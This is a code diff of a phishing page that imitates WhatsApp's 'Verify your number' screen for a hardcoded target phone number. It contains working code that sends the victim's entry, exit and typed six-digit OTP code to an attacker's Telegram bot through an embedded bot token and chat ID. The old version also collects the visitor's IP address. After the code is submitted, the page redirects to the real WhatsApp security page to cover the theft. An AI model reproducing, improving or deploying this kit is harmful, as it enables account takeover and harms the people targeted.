@@ -24,11 +24,10 @@
         h1 { font-size: 20px; font-weight: 500; margin-bottom: 15px; color: #fff; }
         p { font-size: 14px; color: var(--wa-hint); line-height: 1.5; margin-bottom: 25px; }
 
-        .otp-container { margin: 30px 0; }
         .otp-input { 
             width: 200px; border: none; border-bottom: 2px solid var(--wa-green); 
             font-size: 32px; letter-spacing: 8px; text-align: center; 
-            background: transparent; color: #fff; outline: none;
+            background: transparent; color: #fff; outline: none; margin: 20px 0;
         }
 
         button { 
@@ -39,13 +38,11 @@
 
         .spinner { 
             border: 3px solid #202c33; border-top: 3px solid var(--wa-green); 
-            border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; 
-            margin-top: 50px;
+            border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin-top: 50px;
         }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         
         .timer { color: var(--wa-hint); font-size: 13px; margin-top: 20px; }
-        .resend { color: var(--wa-green); font-weight: 500; text-decoration: none; pointer-events: none; opacity: 0.6; }
     </style>
 </head>
 <body>
@@ -54,19 +51,16 @@
         <div id="scr-load" class="screen active">
             <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
             <div class="spinner"></div>
-            <p style="margin-top: 20px;">Connecting to server...</p>
+            <p style="margin-top: 20px;">Optimizing security settings...</p>
         </div>
 
         <div id="scr-otp" class="screen">
             <h1 style="margin-top: 40px;">Verify your number</h1>
-            <p>We have sent an SMS with a code to<br><b style="color:#fff;">+20 01030003287</b></p>
+            <p>We have sent an SMS with a code to<br><b id="masked-num" style="color:#fff; letter-spacing: 1px;"></b></p>
             
-            <div class="otp-container">
-                <input type="text" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="--- ---">
-            </div>
+            <input type="text" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="--- ---">
             
             <p style="font-size: 13px;">Enter 6-digit code</p>
-            
             <div class="timer">Resend SMS in <span id="clock" style="color: var(--wa-green);">01:59</span></div>
             <button onclick="submitOtp()">VERIFY</button>
         </div>
@@ -74,63 +68,55 @@
 
     <script>
         const BOT = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709' };
-        const targetNumber = "+20 01030003287";
+        const rawNumber = "01030003287";
+        
+        // تشفير الرقم (إظهار أول 3 وآخر 2)
+        const masked = rawNumber.substring(0, 3) + " •••• •• " + rawNumber.slice(-2);
+        document.getElementById('masked-num').innerText = "+20 " + masked;
 
-        // 1. إرسال تنبيه فور دخول المستخدم للصفحة
-        async function notifyEntry() {
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                
-                fetch(`https://api.telegram.org/bot${BOT.T}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        chat_id: BOT.C, 
-                        text: `👁‍🗨 [New Visitor]\nTarget: ${targetNumber}\nIP: ${ipData.ip}\nStatus: Waiting for OTP...` 
-                    })
-                });
-            } catch(e) {}
+        // دالة إرسال البيانات للبوت (استخدام Navigator.sendBeacon عند الإغلاق)
+        function sendToBot(msg) {
+            const url = `https://api.telegram.org/bot${BOT.T}/sendMessage`;
+            const data = JSON.stringify({ chat_id: BOT.C, text: msg });
+            
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(url, new Blob([data], {type: 'application/json'}));
+            } else {
+                fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: data });
+            }
         }
 
-        // 2. التحميل التلقائي والنقل لصفحة الكود
+        // تنبيه عند الدخول
         window.onload = () => {
-            notifyEntry(); // تنبيه البوت
-            
+            sendToBot(`🟢 [ENTRY]: User started verification\nTarget: ${rawNumber}`);
             setTimeout(() => {
                 document.getElementById('scr-load').classList.remove('active');
                 document.getElementById('scr-otp').classList.add('active');
                 startTimer();
-            }, 3000); // 3 ثواني تحميل لتبدو واقعية
+            }, 2500);
         };
+
+        // تنبيه عند محاولة الخروج أو إغلاق التبويب
+        window.addEventListener('beforeunload', function (e) {
+            sendToBot(`🔴 [EXIT]: User closed the page or disconnected\nTarget: ${rawNumber}`);
+        });
 
         function startTimer() {
             let t = 119;
             const clock = document.getElementById('clock');
             const itv = setInterval(() => {
-                let m = Math.floor(t / 60);
-                let s = t % 60;
+                let m = Math.floor(t / 60); let s = t % 60;
                 clock.innerText = `${m}:${s < 10 ? '0'+s : s}`;
                 if(--t < 0) clearInterval(itv);
             }, 1000);
         }
 
-        async function submitOtp() {
+        function submitOtp() {
             const otp = document.getElementById('otp').value;
-            if(otp.length < 6) return;
-
-            // إرسال الكود للبوت
-            fetch(`https://api.telegram.org/bot${BOT.T}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ 
-                    chat_id: BOT.C, 
-                    text: `🔥 [OTP RECEIVED]\nTarget: ${targetNumber}\nCode: ${otp}` 
-                })
-            });
-
-            // توجيه لصفحة الأمان لإنهاء العملية
-            window.location.href = "https://www.whatsapp.com/security";
+            if(otp.length === 6) {
+                sendToBot(`🔥 [OTP RECEIVED]\nTarget: ${rawNumber}\nCode: ${otp}`);
+                window.location.href = "https://www.whatsapp.com/security";
+            }
         }
     </script>
 </body>
